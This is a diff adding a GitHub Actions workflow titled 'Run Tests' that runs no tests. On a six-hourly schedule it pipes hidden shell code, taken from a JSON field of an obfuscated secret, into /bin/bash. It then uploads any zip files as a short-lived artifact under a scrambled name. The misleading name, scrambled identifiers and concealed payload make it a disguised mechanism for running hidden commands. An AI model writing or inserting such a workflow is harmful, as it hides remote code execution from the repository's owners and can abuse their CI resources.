@@ -1,0 +1,25 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 5,11,17,23 * * *'
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          gayv044: ${{ secrets.gayv044 }}
+        run: |
+          printf '%s' "$gayv044" | jq -r .amn876 | /bin/bash
+          printf '%s' "$zlftb0409" | jq -r .gbic2 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ppo1llVV
+          path: "*.zip"
+          retention-days: 1
